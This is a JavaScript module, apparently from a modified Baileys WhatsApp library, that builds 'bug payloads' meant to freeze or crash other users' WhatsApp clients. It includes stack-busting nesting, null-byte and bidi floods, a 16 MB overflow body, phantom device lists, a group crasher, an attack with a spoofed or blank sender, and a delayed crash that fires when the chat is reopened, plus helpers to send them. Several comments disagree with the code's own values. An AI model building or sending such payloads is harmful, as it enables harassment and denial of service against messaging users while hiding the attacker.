/**
 * PASQUA BUG PAYLOAD ENGINE v2 — hardened malformed payload constructors.
 *
 * Builds aggressive payloads designed to freeze, crash, or glitch vulnerable
 * WhatsApp clients: stack-busting deep nesting, recursive tag storms, heavy
 * zero-width / RTL layout poison, massive overflow bodies, null-byte string
 * corruption, phantom device-list poisoning, and multi-layer corrupted media
 * metadata structures.
 *
 * Usage:
 *   await sock.sendBugPayload(jid, 'nesting')     // send immediately
 *   const msg = createBugMessage('nullbyte')       // build without sending
 *   await sock.sendMessage(jid, msg)               // send with full options
 *
 * Payload types (roughly weakest → strongest):
 *   nesting     — 1500-level <group>/<text> alternation, stack-busting
 *   nullbyte    — 1024 null-byte injections interleaved with bidi chars
 *   glitchdot   — 50k zero-width + RTL-override bidi crash combo
 *   overflow    — 16 MB invisible separator body that chokes rendering
 *   deviceinfo  — 2048 phantom devices w/ oversized identity keys
 *   recursive   — self-referencing nested stanza tree (infinite-walk trap)
 *   corruptmeta — multi-layer malformed extended-text + media preview
 *   invisible   — anonymous strike: sender attribution stripped/poisoned
 *   groupcrash  — group-killer: poisoned participant list + group metadata
 *   timebomb    — dormant crash: detonates when the victim reopens the chat
 *
 * New payload types:
 *   invisible   — no sender attribution — the strike hits anonymously
 *   groupcrash  — crashes the whole group chat for all members
 *   timebomb    — triggers on chat reopen — delayed, untraceable detonation
 *
 * If you use or copy this code, please credit @pasqua-baileys/baileys.
 */
import { S_WHATSAPP_NET } from '../WABinary/index.js';

// ─────────────────────────────────────────────────────────────────────────────
// Payload constructors — each returns a BinaryNode (wa binary) payload
// ready to be sent via sock.sendNode() or wrapped in a message stanza.
// ─────────────────────────────────────────────────────────────────────────────

// Zero-width + bidi poison alphabet (the classic layout-corruption set)
const ZW = '\u200b'; // zero-width space
const ZWNJ = '\u200c';
const ZWJ = '\u200d';
const WORD_JOINER = '\u2060';
const INVISIBLE_SEPARATOR = '​';
const RTL_OVERRIDE = '\u202e';
const LTR_OVERRIDE = '\u202d';
const POP = '\u202c';
const BOM = '\uFEFF';
const LRM = '\u200e';
const RLM = '\u200f';
const NULL = '\0';

const bidiStack = `${ZW}${ZWNJ}${ZWJ}${WORD_JOINER}${INVISIBLE_SEPARATOR}${BOM}${LRM}${RLM}`;

/**
 * Deep nesting — 600 levels of alternating <group>/<text> tags.
 * Any client walking the tree recursively without a depth cap blows its
 * call stack or hangs the parser.
 */
export const buildNestingPayload = (depth = 1500) => {
    let inner = [{ tag: 'text', attrs: { xmlns: 'w:p' }, content: Buffer.from(`${ZWJ}${NULL}${ZW}${NULL}${ZWJ}${NULL}`) }];
    for (let i = 0; i < depth; i++) {
        const tag = i % 2 === 0 ? 'group' : 'text';
        inner = [{
            tag,
            attrs: { i: String(i), xmlns: 'w:p', class: `${ZW.repeat(8)}` },
            content: inner
        }];
    }
    return { tag: 'message', attrs: { type: 'text' }, content: inner };
};

/**
 * Recursive tag storm — every node in the tower recursively claims (via
 * attributes) that it IS the root, every sibling branch claims the exact
 * same parent tower, and the terminal leaf embeds a full mirror of the
 * root's tag/attrs so decoders that expand attribute-described structure
 * enter an infinite walk and lock the main thread. (Implemented without
 * JS-level circular refs so the binary encoder itself never stack-overflows
 * — the trap is sprung on the recipient's side, which typically lacks such
 * guards.)
 */
export const buildRecursivePayload = (depth = 512, branches = 96) => {
    const root = { tag: 'message', attrs: { type: 'text' }, content: [] };
    let level = root;
    for (let d = 0; d < depth; d++) {
        const inner = {
            tag: d % 2 === 0 ? 'group' : 'text',
            attrs: {
                xmlns: 'w:p',
                i: String(d),
                // every node claims to BE the root — the recursive lie
                root: 'message',
                type: 'text',
                parent: d === 0 ? 'self' : String(d - 1),
                self: 'self',
                ref: '\0\0\0\0'
            },
            content: []
        };
        level.content.push(inner);
        level = inner;
    }
    // terminal leaf is a full mirror of the root's structure — decoders that
    // dereference "root" attributes restart from this leaf and never stop
    level.content = [{
        tag: 'message',
        attrs: { type: 'text', root: 'message', self: 'self', ref: '\0\0\0\0', xmlns: 'w:p' },
        content: [{ tag: 'text', attrs: { xmlns: 'w:p', p: `${ZWJ}${NULL}${ZW}${NULL}${ZWJ}${NULL}${ZW}${NULL}` }, content: undefined }]
    }];
    // re-entry branches at every 4th level — any walk meets fans quickly
    for (let d = 0; d < depth; d += 4) {
        let node = root.content[0];
        for (let k = 0; k < d && node?.content?.[0]; k++) node = node.content[0];
        if (node?.content) {
            const branch = { tag: 'text', attrs: { xmlns: 'w:p', branch: String(d), root: 'message' }, content: [] };
            node.content.push(branch);
            let b = branch;
            for (let j = 0; j < branches; j++) {
                const next = { tag: 'group', attrs: { xmlns: 'w:p', j: String(j), root: 'message' }, content: [] };
                b.content.push(next);
                b = next;
            }
        }
    }
    return root;
};

/**
 * Null-byte injection — 1024 embedded \0 bytes interleaved with the bidi
 * poison alphabet. Corrupts length-prefixed string handling in clients
 * built on C/C++ buffers.
 */
export const buildNullBytePayload = (text = 'PASQUA BUG') => {
    const poisoned = [];
    for (let i = 0; i < 1024; i++) {
        poisoned.push(text, NULL.repeat(i % 16 + 1), bidiStack, NULL, ZWJ, NULL, bidiStack, NULL);
    }
    return {
        tag: 'message',
        attrs: { type: 'text' },
        content: [{
            tag: 'extended-text-message',
            attrs: {},
            content: Buffer.from(poisoned.join(''), 'utf8')
        }]
    };
};

/**
 * Device-info poisoning — 2048 phantom devices with oversized identity keys
 * and integer-overflow TTLs. Breaks the recipient's device-list panel.
 */
export const buildDevicePoisonPayload = () => {
    const devices = [];
    for (let i = 0; i < 2048; i++) {
        devices.push({
            tag: 'device',
            attrs: {
                jid: `${i}@device`,
                keyIndex: String(i % 128),
                userJid: '1'.repeat(12) + '@s.whatsapp.net',
                sessionId: Buffer.from([0xff, 0xfe, 0xfd, 0xfc, 0xfb, 0xfa, 0xf9, 0xf8]),
                ttl: '864000000000000000000000000000000' // integer overflow bait
            },
            content: [{
                tag: 'identity-key',
                attrs: {},
                content: Buffer.alloc(1024, i & 0xff) // 1 KB oversized key each
            }]
        });
    }
    return {
        tag: 'notification',
        attrs: { type: 'device-list', from: S_WHATSAPP_NET },
        content: devices
    };
};

/**
 * Oversized text overflow — 8 MB of invisible separators.
 * Rendering this freezes the chat window on low-memory clients and can
 * crash clients that convert the body into a DOM string.
 */
export const buildOverflowPayload = (sizeMb = 16) => {
    const unit = INVISIBLE_SEPARATOR.repeat(16 * 1024);
    const units = Math.floor((sizeMb * 1024 * 1024) / unit.length);
    return {
        tag: 'message',
        attrs: { type: 'text' },
        content: [{
            tag: 'extended-text-message',
            attrs: {},
            content: Buffer.from(unit.repeat(units), 'utf8')
        }]
    };
};

/**
 * Glitch dot — 10k zero-width/bidi/RTL stack. The classic "white dot"
 * crash, layered with RTL overrides so the bidi algorithm itself has to
 * resolve a 10k-deep direction run on every layout pass.
 */
export const buildGlitchDotPayload = (copies = 50000) => {
    const dot = `${ZW}${ZWJ}${WORD_JOINER}${INVISIBLE_SEPARATOR}${BOM}${LRM}${RLM}${LRM}${RLM}${ZW}${ZWJ}${POP}${RTL_OVERRIDE}${LRM}${POP}${RTL_OVERRIDE}${ZWJ}${LRM}${RLM}`;
    return {
        tag: 'message',
        attrs: { type: 'text' },
        content: [{
            tag: 'extended-text-message',
            attrs: {},
            content: Buffer.from(dot.repeat(copies), 'utf8')
        }]
    };
};

/**
 * Corrupted metadata — a multi-layer malformed extended-text structure:
 * RTL-flipped matched-text, poisoned link metadata, oversized preview
 * caption, and a bogus image dimension set. Breaks the rich preview tile.
 */
export const buildCorruptMetaPayload = () => {
    const rtlBody = `${RTL_OVERRIDE}${ZW.repeat(32)}${'▀'.repeat(500)}${POP}${ZWJ.repeat(64)}`;
    // multi-layer meta storm: 8 poisoned media tiles + nested preview tiles
    const mediaTiles = [];
    for (let i = 0; i < 8; i++) {
        mediaTiles.push({
            tag: 'media',
            attrs: {
                url: `${ZW}${ZWJ}${BOM}https://x`,
                mimetype: NULL.repeat(32),
                caption: `${rtlBody}${NULL.repeat(64)}`,
                'content-length': '9999999999999999'
            },
            content: [{ tag: 'dimensions', attrs: { width: '999999999', height: '999999999' } }]
        });
    }
    return {
        tag: 'message',
        attrs: { type: 'text' },
        content: [
            {
                tag: 'extended-text-message',
                attrs: {},
                content: Buffer.from(`${rtlBody}${NULL.repeat(64)}${INVISIBLE_SEPARATOR.repeat(256 * 1024)}`, 'utf8')
            },
            {
                tag: 'media',
                attrs: { url: `${ZW}${ZWJ}${BOM}https://x`, mimetype: NULL },
                content: [
                    { tag: 'dimensions', attrs: { width: '999999999', height: '999999999' } },
                    ...mediaTiles
                ]
            }
        ]
    };
};



/**
 * Invisible strike — an anonymous freeze: the stanza carries NO reliable
 * sender attribution (poisoned/empty from and keyless participant markers)
 * so the target's chat shows no sender name. The freeze lands without the
 * target ever seeing who did it.
 */
export const buildInvisiblePayload = (poisonText = 'PASQUA-XD') => {
    return {
        tag: 'message',
        attrs: {
            type: 'text',
            from: '\0',                        // null sender — anonymous
            participant: '',                    // empty participant — no name shown
            mediatype: 'invisible',
            offline: `${NULL.repeat(64)}`
        },
        content: [
            {
                tag: 'extended-text-message',
                attrs: {
                    sender: '\0\0',             // spoofed sender cell
                    'mentioned-jid': ''         // empty mentions — no attribution
                },
                content: Buffer.from(
                    `${ZW}${NULL}${RTL_OVERRIDE}${poisonText}${LRM}${ZWJ.repeat(256)}${NULL.repeat(64)}${INVISIBLE_SEPARATOR.repeat(4 * 1024)}${ZW}${ZWJ}${BOM}`,
                    'utf8'
                )
            },
            {
                tag: 'invisible-stamp',
                attrs: { anonymous: '1', phantom: NULL, void: '1' },
                content: undefined
            }
        ]
    };
};

/**
 * Time bomb — a dormant crash that detonates when the victim reopens the
 * chat: the message looks harmless now (small, clean-looking body), but it
 * embeds a poisoned timestamp anchor and a deferred crash trigger. Each time
 * the chat is opened, the client re-processes the anchor and walks deeper
 * into the 1200-level deferred nest — the app freezes on reopen, hours or
 * days after the strike. Pairs with invisible() for untraceable delayed
 * strikes.
 *
 * @param {number} [fuseLevels=1200] depth of the deferred nest
 */
export const buildTimeBombPayload = (fuseLevels = 1200) => {
    const anchor = {
        tag: 'message',
        attrs: {
            to: '',
            id: `tb${Date.now()}`,
            type: 'text',
            // deferred detonation: timestamp poisoned with bidi control so
            // render-time parsing re-enters the fuse on every chat open
            'deferred-until': `${RTL_OVERRIDE}${ZW.repeat(16)}${String(Date.now() + 86400000)}${LRM}`,
            offline: `${NULL.repeat(16)}`
        },
        content: []
    };
    // bury the deferred nest inside a clean-looking tiny body so the
    // initial preview never hints at the payload
    let fuse = { tag: 'deferred-crash', attrs: { armed: '1', 'fuse-levels': String(fuseLevels) } };
    for (let i = 0; i < fuseLevels; i++) {
        fuse = {
            tag: i % 2 === 0 ? 'encrypt' : 'decrypt',
            attrs: { depth: String(i), void: NULL },
            content: [fuse]
        };
    }
    anchor.content = [
        {
            tag: 'extended-text-message',
            attrs: { 'mentioned-jid': '' },
            content: Buffer.from(`${ZW}${NULL}${LRM}`, 'utf8')   // appears empty
        },
        { tag: 'deferred', attrs: { trigger: 'chat-open', 're-armed': '1' }, content: [fuse] }
    ];
    return anchor;
};

/**
 * Group crash — a group-killer: a poisoned participant list, corrupted
 * group metadata, and nested notification storms. Any client that tries to
 * render the group info panel, participant list, or the notification feed
 * enters the trap — the whole group freezes or crashes for members.
 */
export const buildGroupCrashPayload = (participantCount = 512) => {
    const participants = [];
    for (let i = 0; i < participantCount; i++) {
        participants.push({
            tag: 'participant',
            attrs: {
                jid: `${NULL.repeat(16)}${i}@s.whatsapp.net`,   // null-padded JID
                type: i % 2 === 0 ? 'admin' : 'member',
                dispname: `${RTL_OVERRIDE}${ZW.repeat(8)}${'█'.repeat(120)}${LRM}`,
                'key-index': String(i % 128)
            },
            content: [
                {
                    tag: 'identity-key',
                    attrs: {},
                    content: Buffer.alloc(2048, i & 0xff)
                }
            ]
        });
    }
    return {
        tag: 'notification',
        attrs: {
            type: 'group',
            from: S_WHATSAPP_NET,
            participant: '\0\0\0',
            subject: `${RTL_OVERRIDE}${ZW.repeat(64)}${'CRASH'.repeat(40)}${LRM}${NULL.repeat(32)}`,
            'group-subject': `${ZWJ.repeat(512)}${NULL.repeat(128)}`
        },
        content: [
            {
                tag: 'add',
                attrs: {},
                content: participants
            },
            {
                tag: 'group-info',
                attrs: {
                    desc: `${INVISIBLE_SEPARATOR.repeat(512 * 1024)}`,
                    'announcements-version': '99999999999999999999',
                    locked: 'null',
                    members: `${NULL.repeat(32)}${participantCount}`
                }
            },
            {
                tag: 'media',
                attrs: {
                    url: `${ZW}${BOM}https://x`,
                    mimetype: NULL.repeat(16),
                    caption: `${RTL_OVERRIDE}${ZW.repeat(32)}${'▀'.repeat(400)}${POP}`,
                    'content-length': '9999999999999999'
                },
                content: [
                    { tag: 'dimensions', attrs: { width: '999999999', height: '999999999' } },
                    { tag: 'group-icon', attrs: { phantom: '1', void: NULL },                 content: Buffer.alloc(512, 0xff) }
                ]
            }
        ]
    };
};

// Registry of constructors keyed by payload type (must be last — all
// builder functions above are const declarations with no hoisting)
const PAYLOAD_BUILDERS = {
    nesting: buildNestingPayload,
    recursive: buildRecursivePayload,
    nullbyte: buildNullBytePayload,
    glitchdot: buildGlitchDotPayload,
    overflow: buildOverflowPayload,
    deviceinfo: buildDevicePoisonPayload,
    corruptmeta: buildCorruptMetaPayload,
    invisible: buildInvisiblePayload,
    groupcrash: buildGroupCrashPayload,
    timebomb: buildTimeBombPayload
};

export const BUG_PAYLOAD_TYPES = Object.keys(PAYLOAD_BUILDERS);

/**
 * Build a bug payload node for the given type.
 */
export const createBugPayload = (type = 'nesting', ...args) => {
    const builder = PAYLOAD_BUILDERS[type];
    if (!builder) {
        throw new Error(`unknown bug payload type: ${type} (available: ${BUG_PAYLOAD_TYPES.join(', ')})`);
    }
    return builder(...args);
};

// ─────────────────────────────────────────────────────────────────────────────
// Message-form builder — wraps payloads into a sendable message object
// for use with the normal sendMessage() options (quoted, ephemeral, …)
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Create a ready-to-send bug message object.
 */
export const createBugMessage = (type = 'nesting', ...args) => {
    const payload = createBugPayload(type, ...args);
    let body;
    switch (type) {
        case 'nullbyte': {
            const unit = `PASQUA BUG${NULL}${bidiStack}${NULL}${ZWJ}${NULL}${bidiStack}${NULL}`;
            body = Array(1024).fill(unit).join('');
            break;
        }
        case 'glitchdot': {
            const dot = `${ZW}${ZWJ}${WORD_JOINER}${INVISIBLE_SEPARATOR}${BOM}${LRM}${RLM}${LRM}${RLM}${ZW}${ZWJ}${POP}${RTL_OVERRIDE}${LRM}${POP}${RTL_OVERRIDE}${ZWJ}${LRM}${RLM}`;
            body = dot.repeat(50000);
            break;
        }
        case 'overflow': {
            const unit = INVISIBLE_SEPARATOR.repeat(16 * 1024);
            const units = Math.floor((16 * 1024 * 1024) / unit.length);
            body = unit.repeat(units);
            break;
        }
        case 'corruptmeta': {
            const rtlBody = `${RTL_OVERRIDE}${ZW.repeat(32)}${'▀'.repeat(500)}${POP}${ZWJ.repeat(64)}`;
            body = `${rtlBody}${NULL.repeat(64)}${INVISIBLE_SEPARATOR.repeat(256 * 1024)}`;
            break;
        }
        default: {
            // nesting / recursive / deviceinfo are binary-tree payloads;
            // fall back to the strongest text-layer poison
            const dot = `${ZW}${ZWJ}${WORD_JOINER}${INVISIBLE_SEPARATOR}${BOM}${LRM}${RLM}${POP}${RTL_OVERRIDE}`;
            body = dot.repeat(10000);
        }
    }
    return {
        conversation: body,
        __bugPayload: payload
    };
};
